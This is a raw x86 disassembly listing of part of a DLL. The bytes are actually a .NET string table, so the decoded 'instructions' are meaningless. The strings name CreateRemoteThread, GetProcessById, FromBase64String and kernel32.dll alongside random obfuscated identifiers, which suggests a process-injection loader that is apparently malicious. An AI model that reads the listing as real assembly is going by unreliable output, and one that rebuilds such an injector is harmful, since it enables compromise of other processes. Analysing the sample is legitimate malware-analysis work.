10002c0f:	4d                   	dec    %ebp
10002c10:	41                   	inc    %ecx
10002c11:	54                   	push   %esp
10002c12:	49                   	dec    %ecx
10002c13:	4f                   	dec    %edi
10002c14:	4e                   	dec    %esi
10002c15:	00 50 57             	add    %dl,0x57(%eax)
10002c18:	4d                   	dec    %ebp
10002c19:	65 4d                	gs dec %ebp
10002c1b:	6c                   	insb   (%dx),%es:(%edi)
10002c1c:	72 37                	jb     0x10002c55
10002c1e:	53                   	push   %ebx
10002c1f:	70 76                	jo     0x10002c97
10002c21:	39 4a 5a             	cmp    %ecx,0x5a(%edx)
10002c24:	32 35 46 53 4e 00    	xor    0x4e5346,%dh
10002c2a:	57                   	push   %edi
10002c2b:	65 66 71 42          	gs data16 jno 0x10002c71
10002c2f:	72 7a                	jb     0x10002cab
10002c31:	30 30                	xor    %dh,(%eax)
10002c33:	37                   	aaa
10002c34:	43                   	inc    %ebx
10002c35:	67 61                	addr16 popa
10002c37:	57                   	push   %edi
10002c38:	4e                   	dec    %esi
10002c39:	00 4a 6e             	add    %cl,0x6e(%edx)
10002c3c:	56                   	push   %esi
10002c3d:	6c                   	insb   (%dx),%es:(%edi)
10002c3e:	41                   	inc    %ecx
10002c3f:	46                   	inc    %esi
10002c40:	4f                   	dec    %edi
10002c41:	38 42 6c             	cmp    %al,0x6c(%edx)
10002c44:	4a                   	dec    %edx
10002c45:	4a                   	dec    %edx
10002c46:	4b                   	dec    %ebx
10002c47:	54                   	push   %esp
10002c48:	44                   	inc    %esp
10002c49:	76 31                	jbe    0x10002c7c
10002c4b:	59                   	pop    %ecx
10002c4c:	4e                   	dec    %esi
10002c4d:	00 53 54             	add    %dl,0x54(%ebx)
10002c50:	41                   	inc    %ecx
10002c51:	52                   	push   %edx
10002c52:	54                   	push   %esp
10002c53:	55                   	push   %ebp
10002c54:	50                   	push   %eax
10002c55:	49                   	dec    %ecx
10002c56:	4e                   	dec    %esi
10002c57:	46                   	inc    %esi
10002c58:	4f                   	dec    %edi
10002c59:	00 53 79             	add    %dl,0x79(%ebx)
10002c5c:	73 74                	jae    0x10002cd2
10002c5e:	65 6d                	gs insl (%dx),%es:(%edi)
10002c60:	2e 49                	cs dec %ecx
10002c62:	4f                   	dec    %edi
10002c63:	00 4d 56             	add    %cl,0x56(%ebp)
10002c66:	57                   	push   %edi
10002c67:	58                   	pop    %eax
10002c68:	57                   	push   %edi
10002c69:	6b 43 48 79          	imul   $0x79,0x48(%ebx),%eax
10002c6d:	5a                   	pop    %edx
10002c6e:	38 65 5a             	cmp    %ah,0x5a(%ebp)
10002c71:	58                   	pop    %eax
10002c72:	67 54                	addr16 push %esp
10002c74:	4f                   	dec    %edi
10002c75:	00 46 4b             	add    %al,0x4b(%esi)
10002c78:	61                   	popa
10002c79:	43                   	inc    %ebx
10002c7a:	4d                   	dec    %ebp
10002c7b:	78 6b                	js     0x10002ce8
10002c7d:	52                   	push   %edx
10002c7e:	72 61                	jb     0x10002ce1
10002c80:	47                   	inc    %edi
10002c81:	36 31 62 34          	xor    %esp,%ss:0x34(%edx)
10002c85:	6c                   	insb   (%dx),%es:(%edi)
10002c86:	54                   	push   %esp
10002c87:	47                   	inc    %edi
10002c88:	38 74 36 66          	cmp    %dh,0x66(%esi,%esi,1)
10002c8c:	53                   	push   %ebx
10002c8d:	00 4a 78             	add    %cl,0x78(%edx)
10002c90:	6c                   	insb   (%dx),%es:(%edi)
10002c91:	59                   	pop    %ecx
10002c92:	6a 61                	push   $0x61
10002c94:	62 50 61             	bound  %edx,0x61(%eax)
10002c97:	79 47                	jns    0x10002ce0
10002c99:	4d                   	dec    %ebp
10002c9a:	78 31                	js     0x10002ccd
10002c9c:	35 6a 74 48 46       	xor    $0x4648746a,%eax
10002ca1:	55                   	push   %ebp
10002ca2:	00 54 73 62          	add    %dl,0x62(%ebx,%esi,2)
10002ca6:	41                   	inc    %ecx
10002ca7:	4c                   	dec    %esp
10002ca8:	52                   	push   %edx
10002ca9:	34 74                	xor    $0x74,%al
10002cab:	64 63 5a 79          	arpl   %ebx,%fs:0x79(%edx)
10002caf:	42                   	inc    %edx
10002cb0:	73 55                	jae    0x10002d07
10002cb2:	00 42 6b             	add    %al,0x6b(%edx)
10002cb5:	54                   	push   %esp
10002cb6:	42                   	inc    %edx
10002cb7:	6b 79 78 4c          	imul   $0x4c,0x78(%ecx),%edi
10002cbb:	44                   	inc    %esp
10002cbc:	4a                   	dec    %edx
10002cbd:	55                   	push   %ebp
10002cbe:	33 4a 46             	xor    0x46(%edx),%ecx
10002cc1:	56                   	push   %esi
10002cc2:	00 4c 69 6d          	add    %cl,0x6d(%ecx,%ebp,2)
10002cc6:	62 68 71             	bound  %ebp,0x71(%eax)
10002cc9:	61                   	popa
10002cca:	70 68                	jo     0x10002d34
10002ccc:	4e                   	dec    %esi
10002ccd:	74 73                	je     0x10002d42
10002ccf:	64 52                	fs push %edx
10002cd1:	43                   	inc    %ebx
10002cd2:	56                   	push   %esi
10002cd3:	56                   	push   %esi
10002cd4:	6b 71 57 00          	imul   $0x0,0x57(%ecx),%esi
10002cd8:	58                   	pop    %eax
10002cd9:	74 4d                	je     0x10002d28
10002cdb:	58                   	pop    %eax
10002cdc:	47                   	inc    %edi
10002cdd:	53                   	push   %ebx
10002cde:	72 67                	jb     0x10002d47
10002ce0:	47                   	inc    %edi
10002ce1:	6d                   	insl   (%dx),%es:(%edi)
10002ce2:	47                   	inc    %edi
10002ce3:	70 78                	jo     0x10002d5d
10002ce5:	57                   	push   %edi
10002ce6:	00 64 77 58          	add    %ah,0x58(%edi,%esi,2)
10002cea:	00 64 77 59          	add    %ah,0x59(%edi,%esi,2)
10002cee:	00 56 70             	add    %dl,0x70(%esi)
10002cf1:	75 44                	jne    0x10002d37
10002cf3:	6d                   	insl   (%dx),%es:(%edi)
10002cf4:	48                   	dec    %eax
10002cf5:	38 32                	cmp    %dh,(%edx)
10002cf7:	57                   	push   %edi
10002cf8:	67 4e                	addr16 dec %esi
10002cfa:	68 4e 5a 00 4e       	push   $0x4e005a4e
10002cff:	76 64                	jbe    0x10002d65
10002d01:	73 45                	jae    0x10002d48
10002d03:	44                   	inc    %esp
10002d04:	4f                   	dec    %edi
10002d05:	77 36                	ja     0x10002d3d
10002d07:	72 58                	jb     0x10002d61
10002d09:	38 66 50             	cmp    %ah,0x50(%esi)
10002d0c:	32 44 65 68          	xor    0x68(%ebp,%eiz,2),%al
10002d10:	64 55                	fs push %ebp
10002d12:	48                   	dec    %eax
10002d13:	74 70                	je     0x10002d85
10002d15:	72 61                	jb     0x10002d78
10002d17:	00 63 62             	add    %ah,0x62(%ebx)
10002d1a:	00 6d 73             	add    %ch,0x73(%ebp)
10002d1d:	63 6f 72             	arpl   %ebp,0x72(%edi)
10002d20:	6c                   	insb   (%dx),%es:(%edi)
10002d21:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
10002d28:	65 6d                	gs insl (%dx),%es:(%edi)
10002d2a:	2e 43                	cs inc %ebx
10002d2c:	6f                   	outsl  %ds:(%esi),(%dx)
10002d2d:	6c                   	insb   (%dx),%es:(%edi)
10002d2e:	6c                   	insb   (%dx),%es:(%edi)
10002d2f:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
10002d34:	6e                   	outsb  %ds:(%esi),(%dx)
10002d35:	73 2e                	jae    0x10002d65
10002d37:	47                   	inc    %edi
10002d38:	65 6e                	outsb  %gs:(%esi),(%dx)
10002d3a:	65 72 69             	gs jb  0x10002da6
10002d3d:	63 00                	arpl   %eax,(%eax)
10002d3f:	47                   	inc    %edi
10002d40:	65 74 50             	gs je  0x10002d93
10002d43:	72 6f                	jb     0x10002db4
10002d45:	63 65 73             	arpl   %esp,0x73(%ebp)
10002d48:	73 42                	jae    0x10002d8c
10002d4a:	79 49                	jns    0x10002d95
10002d4c:	64 00 49 77          	add    %cl,%fs:0x77(%ecx)
10002d50:	47                   	inc    %edi
10002d51:	41                   	inc    %ecx
10002d52:	78 45                	js     0x10002d99
10002d54:	4e                   	dec    %esi
10002d55:	76 4f                	jbe    0x10002da6
10002d57:	56                   	push   %esi
10002d58:	33 62 47             	xor    0x47(%edx),%esp
10002d5b:	34 56                	xor    $0x56,%al
10002d5d:	64 00 47 65          	add    %al,%fs:0x65(%edi)
10002d61:	74 45                	je     0x10002da8
10002d63:	78 69                	js     0x10002dce
10002d65:	74 43                	je     0x10002daa
10002d67:	6f                   	outsl  %ds:(%esi),(%dx)
10002d68:	64 65 54             	fs gs push %esp
10002d6b:	68 72 65 61 64       	push   $0x64616572
10002d70:	00 43 72             	add    %al,0x72(%ebx)
10002d73:	65 61                	gs popa
10002d75:	74 65                	je     0x10002ddc
10002d77:	52                   	push   %edx
10002d78:	65 6d                	gs insl (%dx),%es:(%edi)
10002d7a:	6f                   	outsl  %ds:(%esi),(%dx)
10002d7b:	74 65                	je     0x10002de2
10002d7d:	54                   	push   %esp
10002d7e:	68 72 65 61 64       	push   $0x64616572
10002d83:	00 41 64             	add    %al,0x64(%ecx)
10002d86:	64 00 67 65          	add    %ah,%fs:0x65(%edi)
10002d8a:	74 5f                	je     0x10002deb
10002d8c:	48                   	dec    %eax
10002d8d:	61                   	popa
10002d8e:	73 45                	jae    0x10002dd5
10002d90:	78 69                	js     0x10002dfb
10002d92:	74 65                	je     0x10002df9
10002d94:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
10002d98:	70 6c                	jo     0x10002e06
10002d9a:	61                   	popa
10002d9b:	63 65 00             	arpl   %esp,0x0(%ebp)
10002d9e:	49                   	dec    %ecx
10002d9f:	6d                   	insl   (%dx),%es:(%edi)
10002da0:	54                   	push   %esp
10002da1:	43                   	inc    %ebx
10002da2:	53                   	push   %ebx
10002da3:	4f                   	dec    %edi
10002da4:	4b                   	dec    %ebx
10002da5:	63 4a 47             	arpl   %ecx,0x47(%edx)
10002da8:	7a 58                	jp     0x10002e02
10002daa:	55                   	push   %ebp
10002dab:	6c                   	insb   (%dx),%es:(%edi)
10002dac:	31 56 55             	xor    %edx,0x55(%esi)
10002daf:	38 72 68             	cmp    %dh,0x68(%edx)
10002db2:	65 00 45 6e          	add    %al,%gs:0x6e(%ebp)
10002db6:	75 6d                	jne    0x10002e25
10002db8:	65 72 61             	gs jb  0x10002e1c
10002dbb:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
10002dbf:	43                   	inc    %ebx
10002dc0:	6c                   	insb   (%dx),%es:(%edi)
10002dc1:	6f                   	outsl  %ds:(%esi),(%dx)
10002dc2:	73 65                	jae    0x10002e29
10002dc4:	48                   	dec    %eax
10002dc5:	61                   	popa
10002dc6:	6e                   	outsb  %ds:(%esi),(%dx)
10002dc7:	64 6c                	fs insb (%dx),%es:(%edi)
10002dc9:	65 00 66 69          	add    %ah,%gs:0x69(%esi)
10002dcd:	6c                   	insb   (%dx),%es:(%edi)
10002dce:	65 00 56 61          	add    %dl,%gs:0x61(%esi)
10002dd2:	6c                   	insb   (%dx),%es:(%edi)
10002dd3:	75 65                	jne    0x10002e3a
10002dd5:	54                   	push   %esp
10002dd6:	79 70                	jns    0x10002e48
10002dd8:	65 00 57 68          	add    %dl,%gs:0x68(%edi)
10002ddc:	65 72 65             	gs jb  0x10002e44
10002ddf:	00 53 79             	add    %dl,0x79(%ebx)
10002de2:	73 74                	jae    0x10002e58
10002de4:	65 6d                	gs insl (%dx),%es:(%edi)
10002de6:	2e 43                	cs inc %ebx
10002de8:	6f                   	outsl  %ds:(%esi),(%dx)
10002de9:	72 65                	jb     0x10002e50
10002deb:	00 43 6f             	add    %al,0x6f(%ebx)
10002dee:	6d                   	insl   (%dx),%es:(%edi)
10002def:	70 69                	jo     0x10002e5a
10002df1:	6c                   	insb   (%dx),%es:(%edi)
10002df2:	65 72 47             	gs jb  0x10002e3c
10002df5:	65 6e                	outsb  %gs:(%esi),(%dx)
10002df7:	65 72 61             	gs jb  0x10002e5b
10002dfa:	74 65                	je     0x10002e61
10002dfc:	64 41                	fs inc %ecx
10002dfe:	74 74                	je     0x10002e74
10002e00:	72 69                	jb     0x10002e6b
10002e02:	62 75 74             	bound  %esi,0x74(%ebp)
10002e05:	65 00 47 75          	add    %al,%gs:0x75(%edi)
10002e09:	69 64 41 74 74 72 69 	imul   $0x62697274,0x74(%ecx,%eax,2),%esp
10002e10:	62 
10002e11:	75 74                	jne    0x10002e87
10002e13:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
10002e18:	75 67                	jne    0x10002e81
10002e1a:	67 61                	addr16 popa
10002e1c:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
10002e20:	74 74                	je     0x10002e96
10002e22:	72 69                	jb     0x10002e8d
10002e24:	62 75 74             	bound  %esi,0x74(%ebp)
10002e27:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
10002e2b:	6d                   	insl   (%dx),%es:(%edi)
10002e2c:	56                   	push   %esi
10002e2d:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
10002e34:	74 74                	je     0x10002eaa
10002e36:	72 69                	jb     0x10002ea1
10002e38:	62 75 74             	bound  %esi,0x74(%ebp)
10002e3b:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10002e3f:	73 65                	jae    0x10002ea6
10002e41:	6d                   	insl   (%dx),%es:(%edi)
10002e42:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
10002e46:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
10002e4d:	72 
10002e4e:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
10002e55:	73 73                	jae    0x10002eca
10002e57:	65 6d                	gs insl (%dx),%es:(%edi)
10002e59:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
10002e5d:	72 61                	jb     0x10002ec0
10002e5f:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
10002e62:	61                   	popa
10002e63:	72 6b                	jb     0x10002ed0
10002e65:	41                   	inc    %ecx
10002e66:	74 74                	je     0x10002edc
10002e68:	72 69                	jb     0x10002ed3
10002e6a:	62 75 74             	bound  %esi,0x74(%ebp)
10002e6d:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
10002e72:	67 65 74 46          	addr16 gs je 0x10002ebc
10002e76:	72 61                	jb     0x10002ed9
10002e78:	6d                   	insl   (%dx),%es:(%edi)
10002e79:	65 77 6f             	gs ja  0x10002eeb
10002e7c:	72 6b                	jb     0x10002ee9
10002e7e:	41                   	inc    %ecx
10002e7f:	74 74                	je     0x10002ef5
10002e81:	72 69                	jb     0x10002eec
10002e83:	62 75 74             	bound  %esi,0x74(%ebp)
10002e86:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10002e8a:	73 65                	jae    0x10002ef1
10002e8c:	6d                   	insl   (%dx),%es:(%edi)
10002e8d:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
10002e91:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
10002e98:	69 
10002e99:	6f                   	outsl  %ds:(%esi),(%dx)
10002e9a:	6e                   	outsb  %ds:(%esi),(%dx)
10002e9b:	41                   	inc    %ecx
10002e9c:	74 74                	je     0x10002f12
10002e9e:	72 69                	jb     0x10002f09
10002ea0:	62 75 74             	bound  %esi,0x74(%ebp)
10002ea3:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10002ea7:	73 65                	jae    0x10002f0e
10002ea9:	6d                   	insl   (%dx),%es:(%edi)
10002eaa:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
10002eae:	6f                   	outsl  %ds:(%esi),(%dx)
10002eaf:	6e                   	outsb  %ds:(%esi),(%dx)
10002eb0:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
10002eb6:	74 69                	je     0x10002f21
10002eb8:	6f                   	outsl  %ds:(%esi),(%dx)
10002eb9:	6e                   	outsb  %ds:(%esi),(%dx)
10002eba:	41                   	inc    %ecx
10002ebb:	74 74                	je     0x10002f31
10002ebd:	72 69                	jb     0x10002f28
10002ebf:	62 75 74             	bound  %esi,0x74(%ebp)
10002ec2:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10002ec6:	73 65                	jae    0x10002f2d
10002ec8:	6d                   	insl   (%dx),%es:(%edi)
10002ec9:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
10002ecd:	65 73 63             	gs jae 0x10002f33
10002ed0:	72 69                	jb     0x10002f3b
10002ed2:	70 74                	jo     0x10002f48
10002ed4:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
10002edb:	69 62 75 74 65 00 43 	imul   $0x43006574,0x75(%edx),%esp
10002ee2:	6f                   	outsl  %ds:(%esi),(%dx)
10002ee3:	6d                   	insl   (%dx),%es:(%edi)
10002ee4:	70 69                	jo     0x10002f4f
10002ee6:	6c                   	insb   (%dx),%es:(%edi)
10002ee7:	61                   	popa
10002ee8:	74 69                	je     0x10002f53
10002eea:	6f                   	outsl  %ds:(%esi),(%dx)
10002eeb:	6e                   	outsb  %ds:(%esi),(%dx)
10002eec:	52                   	push   %edx
10002eed:	65 6c                	gs insb (%dx),%es:(%edi)
10002eef:	61                   	popa
10002ef0:	78 61                	js     0x10002f53
10002ef2:	74 69                	je     0x10002f5d
10002ef4:	6f                   	outsl  %ds:(%esi),(%dx)
10002ef5:	6e                   	outsb  %ds:(%esi),(%dx)
10002ef6:	73 41                	jae    0x10002f39
10002ef8:	74 74                	je     0x10002f6e
10002efa:	72 69                	jb     0x10002f65
10002efc:	62 75 74             	bound  %esi,0x74(%ebp)
10002eff:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10002f03:	73 65                	jae    0x10002f6a
10002f05:	6d                   	insl   (%dx),%es:(%edi)
10002f06:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
10002f0a:	72 6f                	jb     0x10002f7b
10002f0c:	64 75 63             	fs jne 0x10002f72
10002f0f:	74 41                	je     0x10002f52
10002f11:	74 74                	je     0x10002f87
10002f13:	72 69                	jb     0x10002f7e
10002f15:	62 75 74             	bound  %esi,0x74(%ebp)
10002f18:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10002f1c:	73 65                	jae    0x10002f83
10002f1e:	6d                   	insl   (%dx),%es:(%edi)
10002f1f:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
10002f23:	6f                   	outsl  %ds:(%esi),(%dx)
10002f24:	70 79                	jo     0x10002f9f
10002f26:	72 69                	jb     0x10002f91
10002f28:	67 68 74 41 74 74    	addr16 push $0x74744174
10002f2e:	72 69                	jb     0x10002f99
10002f30:	62 75 74             	bound  %esi,0x74(%ebp)
10002f33:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
10002f37:	73 65                	jae    0x10002f9e
10002f39:	6d                   	insl   (%dx),%es:(%edi)
10002f3a:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
10002f3e:	6f                   	outsl  %ds:(%esi),(%dx)
10002f3f:	6d                   	insl   (%dx),%es:(%edi)
10002f40:	70 61                	jo     0x10002fa3
10002f42:	6e                   	outsb  %ds:(%esi),(%dx)
10002f43:	79 41                	jns    0x10002f86
10002f45:	74 74                	je     0x10002fbb
10002f47:	72 69                	jb     0x10002fb2
10002f49:	62 75 74             	bound  %esi,0x74(%ebp)
10002f4c:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
10002f50:	6e                   	outsb  %ds:(%esi),(%dx)
10002f51:	74 69                	je     0x10002fbc
10002f53:	6d                   	insl   (%dx),%es:(%edi)
10002f54:	65 43                	gs inc %ebx
10002f56:	6f                   	outsl  %ds:(%esi),(%dx)
10002f57:	6d                   	insl   (%dx),%es:(%edi)
10002f58:	70 61                	jo     0x10002fbb
10002f5a:	74 69                	je     0x10002fc5
10002f5c:	62 69 6c             	bound  %ebp,0x6c(%ecx)
10002f5f:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
10002f66:	69 
10002f67:	62 75 74             	bound  %esi,0x74(%ebp)
10002f6a:	65 00 53 69          	add    %dl,%gs:0x69(%ebx)
10002f6e:	7a 65                	jp     0x10002fd5
10002f70:	4f                   	dec    %edi
10002f71:	66 00 41 59          	data16 add %al,0x59(%ecx)
10002f75:	4c                   	dec    %esp
10002f76:	67 6a 6b             	addr16 push $0x6b
10002f79:	63 46 70             	arpl   %eax,0x70(%esi)
10002f7c:	56                   	push   %esi
10002f7d:	65 4f                	gs dec %edi
10002f7f:	50                   	push   %eax
10002f80:	66 00 57 47          	data16 add %dl,0x47(%edi)
10002f84:	73 62                	jae    0x10002fe8
10002f86:	72 69                	jb     0x10002ff1
10002f88:	67 36 78 4a          	addr16 ss js 0x10002fd6
10002f8c:	7a 4d                	jp     0x10002fdb
10002f8e:	65 44                	gs inc %esp
10002f90:	55                   	push   %ebp
10002f91:	56                   	push   %esi
10002f92:	78 55                	js     0x10002fe9
10002f94:	55                   	push   %ebp
10002f95:	65 66 00 53 79       	data16 add %dl,%gs:0x79(%ebx)
10002f9a:	73 74                	jae    0x10003010
10002f9c:	65 6d                	gs insl (%dx),%es:(%edi)
10002f9e:	2e 54                	cs push %esp
10002fa0:	68 72 65 61 64       	push   $0x64616572
10002fa5:	69 6e 67 00 45 6e 63 	imul   $0x636e4500,0x67(%esi),%ebp
10002fac:	6f                   	outsl  %ds:(%esi),(%dx)
10002fad:	64 69 6e 67 00 53 79 	imul   $0x73795300,%fs:0x67(%esi),%ebp
10002fb4:	73 
10002fb5:	74 65                	je     0x1000301c
10002fb7:	6d                   	insl   (%dx),%es:(%edi)
10002fb8:	2e 52                	cs push %edx
10002fba:	75 6e                	jne    0x1000302a
10002fbc:	74 69                	je     0x10003027
10002fbe:	6d                   	insl   (%dx),%es:(%edi)
10002fbf:	65 2e 56             	gs cs push %esi
10002fc2:	65 72 73             	gs jb  0x10003038
10002fc5:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
10002fcc:	46                   	inc    %esi
10002fcd:	72 6f                	jb     0x1000303e
10002fcf:	6d                   	insl   (%dx),%es:(%edi)
10002fd0:	42                   	inc    %edx
10002fd1:	61                   	popa
10002fd2:	73 65                	jae    0x10003039
10002fd4:	36 34 53             	ss xor $0x53,%al
10002fd7:	74 72                	je     0x1000304b
10002fd9:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
10002fe0:	53                   	push   %ebx
10002fe1:	74 72                	je     0x10003055
10002fe3:	69 6e 67 00 4c 73 59 	imul   $0x59734c00,0x67(%esi),%ebp
10002fea:	4a                   	dec    %edx
10002feb:	48                   	dec    %eax
10002fec:	57                   	push   %edi
10002fed:	34 62                	xor    $0x62,%al
10002fef:	4e                   	dec    %esi
10002ff0:	45                   	inc    %ebp
10002ff1:	4c                   	dec    %esp
10002ff2:	76 6c                	jbe    0x10003060
10002ff4:	70 30                	jo     0x10003026
10002ff6:	4d                   	dec    %ebp
10002ff7:	32 44 6e 69          	xor    0x69(%esi,%ebp,2),%al
10002ffb:	57                   	push   %edi
10002ffc:	6b 70 67 00          	imul   $0x0,0x67(%eax),%esi
10003000:	48                   	dec    %eax
10003001:	75 41                	jne    0x10003044
10003003:	46                   	inc    %esi
10003004:	71 73                	jno    0x10003079
10003006:	6b 63 45 4b          	imul   $0x4b,0x45(%ebx),%esp
1000300a:	46                   	inc    %esi
1000300b:	6e                   	outsb  %ds:(%esi),(%dx)
1000300c:	77 4e                	ja     0x1000305c
1000300e:	44                   	inc    %esp
1000300f:	36 41                	ss inc %ecx
10003011:	4a                   	dec    %edx
10003012:	38 41 51             	cmp    %al,0x51(%ecx)
10003015:	6c                   	insb   (%dx),%es:(%edi)
10003016:	45                   	inc    %ebp
10003017:	68 00 4f 56 69       	push   $0x69564f00
1000301c:	44                   	inc    %esp
1000301d:	43                   	inc    %ebx
1000301e:	6c                   	insb   (%dx),%es:(%edi)
1000301f:	4b                   	dec    %ebx
10003020:	51                   	push   %ecx
10003021:	44                   	inc    %esp
10003022:	4f                   	dec    %edi
10003023:	39 76 6d             	cmp    %esi,0x6d(%esi)
10003026:	79 45                	jns    0x1000306d
10003028:	37                   	aaa
10003029:	35 4f 55 39 31       	xor    $0x3139554f,%eax
1000302e:	79 72                	jns    0x100030a2
10003030:	6b 68 00 50          	imul   $0x50,0x0(%eax),%ebp
10003034:	61                   	popa
10003035:	74 68                	je     0x1000309f
10003037:	00 43 4d             	add    %al,0x4d(%ebx)
1000303a:	62 56 4d             	bound  %edx,0x4d(%esi)
1000303d:	46                   	inc    %esi
1000303e:	4d                   	dec    %ebp
1000303f:	6c                   	insb   (%dx),%es:(%edi)
10003040:	53                   	push   %ebx
10003041:	6b 67 76 49          	imul   $0x49,0x76(%edi),%esp
10003045:	37                   	aaa
10003046:	44                   	inc    %esp
10003047:	57                   	push   %edi
10003048:	73 53                	jae    0x1000309d
1000304a:	55                   	push   %ebp
1000304b:	48                   	dec    %eax
1000304c:	7a 50                	jp     0x1000309e
1000304e:	6a 00                	push   $0x0
10003050:	53                   	push   %ebx
10003051:	58                   	pop    %eax
10003052:	58                   	pop    %eax
10003053:	4c                   	dec    %esp
10003054:	4e                   	dec    %esi
10003055:	45                   	inc    %ebp
10003056:	69 31 45 6e 58 51    	imul   $0x51586e45,(%ecx),%esi
1000305c:	32 49 48             	xor    0x48(%ecx),%cl
1000305f:	7a 6b                	jp     0x100030cc
10003061:	52                   	push   %edx
10003062:	64 34 54             	fs xor $0x54,%al
10003065:	55                   	push   %ebp
10003066:	73 6a                	jae    0x100030d2
10003068:	00 4d 61             	add    %cl,0x61(%ebp)
1000306b:	72 73                	jb     0x100030e0
1000306d:	68 61 6c 00 6b       	push   $0x6b006c61
10003072:	65 72 6e             	gs jb  0x100030e3
10003075:	65 6c                	gs insb (%dx),%es:(%edi)
10003077:	33 32                	xor    (%edx),%esi
10003079:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
1000307c:	6c                   	insb   (%dx),%es:(%edi)
1000307d:	00 41 59             	add    %al,0x59(%ecx)
10003080:	4c                   	dec    %esp
10003081:	67 6a 6b             	addr16 push $0x6b
10003084:	63 46 70             	arpl   %eax,0x70(%esi)
10003087:	56                   	push   %esi
10003088:	65 4f                	gs dec %edi
1000308a:	50                   	push   %eax
1000308b:	66 2e 64 6c          	data16 cs fs insb (%dx),%es:(%edi)
1000308f:	6c                   	insb   (%dx),%es:(%edi)
10003090:	00 4b 69             	add    %cl,0x69(%ebx)
10003093:	6c                   	insb   (%dx),%es:(%edi)
10003094:	6c                   	insb   (%dx),%es:(%edi)
10003095:	00 53 79             	add    %dl,0x79(%ebx)
10003098:	73 74                	jae    0x1000310e
1000309a:	65 6d                	gs insl (%dx),%es:(%edi)
1000309c:	00 52 61             	add    %dl,0x61(%edx)
1000309f:	6e                   	outsb  %ds:(%esi),(%dx)
100030a0:	64 6f                	outsl  %fs:(%esi),(%dx)
100030a2:	6d                   	insl   (%dx),%es:(%edi)
100030a3:	00 47 67             	add    %al,0x67(%edi)
100030a6:	4d                   	dec    %ebp
100030a7:	47                   	inc    %edi
100030a8:	43                   	inc    %ebx
100030a9:	79 6d                	jns    0x10003118
100030ab:	76 43                	jbe    0x100030f0
100030ad:	4d                   	dec    %ebp
100030ae:	50                   	push   %eax
100030af:	33 70 41             	xor    0x41(%eax),%esi
100030b2:	74 48                	je     0x100030fc
100030b4:	55                   	push   %ebp
100030b5:	51                   	push   %ecx
100030b6:	6e                   	outsb  %ds:(%esi),(%dx)
100030b7:	00 47 65             	add    %al,0x65(%edi)
100030ba:	74 46                	je     0x10003102
100030bc:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
100030c3:	57 
100030c4:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%eax,%ebp,2),%esi
100030cb:	78 
100030cc:	74 65                	je     0x10003133
100030ce:	6e                   	outsb  %ds:(%esi),(%dx)
100030cf:	73 69                	jae    0x1000313a
100030d1:	6f                   	outsl  %ds:(%esi),(%dx)
100030d2:	6e                   	outsb  %ds:(%esi),(%dx)
100030d3:	00 53 79             	add    %dl,0x79(%ebx)
100030d6:	73 74                	jae    0x1000314c
100030d8:	65 6d                	gs insl (%dx),%es:(%edi)
100030da:	2e 52                	cs push %edx
100030dc:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
100030df:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
100030e4:	6e                   	outsb  %ds:(%esi),(%dx)
100030e5:	00 53 65             	add    %dl,0x65(%ebx)
100030e8:	61                   	popa
100030e9:	72 63                	jb     0x1000314e
100030eb:	68 4f 70 74 69       	push   $0x6974704f
100030f0:	6f                   	outsl  %ds:(%esi),(%dx)
100030f1:	6e                   	outsb  %ds:(%esi),(%dx)
100030f2:	00 45 78             	add    %al,0x78(%ebp)
100030f5:	63 65 70             	arpl   %esp,0x70(%ebp)
100030f8:	74 69                	je     0x10003163
100030fa:	6f                   	outsl  %ds:(%esi),(%dx)
100030fb:	6e                   	outsb  %ds:(%esi),(%dx)
100030fc:	00 5a 65             	add    %bl,0x65(%edx)
100030ff:	72 6f                	jb     0x10003170
10003101:	00 53 6c             	add    %dl,0x6c(%ebx)
10003104:	65 65 70 00          	gs gs jo 0x10003108
10003108:	46                   	inc    %esi
10003109:	42                   	inc    %edx
1000310a:	4f                   	dec    %edi
1000310b:	6e                   	outsb  %ds:(%esi),(%dx)
1000310c:	58                   	pop    %eax
1000310d:	56                   	push   %esi
1000310e:	42                   	inc    %edx
